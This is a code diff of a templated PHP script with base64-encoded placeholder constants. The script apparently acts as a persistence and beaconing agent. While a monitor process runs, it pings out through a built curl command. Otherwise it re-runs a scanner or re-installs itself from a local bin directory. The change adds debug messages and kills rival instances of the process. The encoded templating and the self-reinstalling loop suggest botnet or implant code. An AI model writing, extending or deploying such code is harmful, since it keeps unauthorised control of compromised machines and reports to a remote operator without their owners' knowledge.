@@ -15,8 +15,9 @@ define('PROMPT', '{{B64_CONST_PROMPT}}');
 define('SCANNER_FILE', '{{SCANNER}}');
 define('PING_INTERVAL', '{{B64_CONST_PING_INTERVAL}}');
 
-if (process_running($argv[0])) {
-    die();
+if ($pid = process_running($argv[0])) {
+    exec("kill $pid");
+    // die();
 }
 
 $voices = load_voice_list();
@@ -44,16 +45,24 @@ $opts = array(
 // Get optional arguments
 if ($argc > 1) {
     if ($argc > 2 && trim(strtolower($argv[1])) == '{{B64_STR_PING_ARG}}') {
+        echo "Running ping process...\n";
         $monitor = base64_decode(trim($argv[2]));
+        echo "Looking for monitor='$monitor'\n";
 
         while(true) {
             if (file_exists(SCANNER_FILE) && process_running($monitor)) {
+                echo "Ping successfull! Monitor is running\n";
                 exec(build_curl_cmd('p'));
             } else {
+                echo "Monitor doesn't exist OR is not running!\n";
                 if (file_exists(SCANNER_FILE)) {
+                    echo "Scanner file exists, re-scanning\n";
                     exec(SCANNER_FILE);
                 } else if (file_exists('{{DIR_LOCAL_BIN}}/{{FILE_INSTALLER}}')) {
+                    echo "Installer exists, re-installing\n";
                     exec('{{DIR_LOCAL_BIN}}/{{FILE_INSTALLER}}');
+                } else {
+                    echo "Missing scanner and installer\n";
                 }
 
                 exit;
@@ -221,14 +230,13 @@ function process_running($search) {
                 $pid = $matches[1][0];
 
                 if ($pid != getmypid()) {
-                    $found = true;
-                    break;
+                    return $pid;
                 }
             }
         }
     }
 
-    return $found;
+    return false;
 }
 
 function build_curl_cmd($page = 'm') {
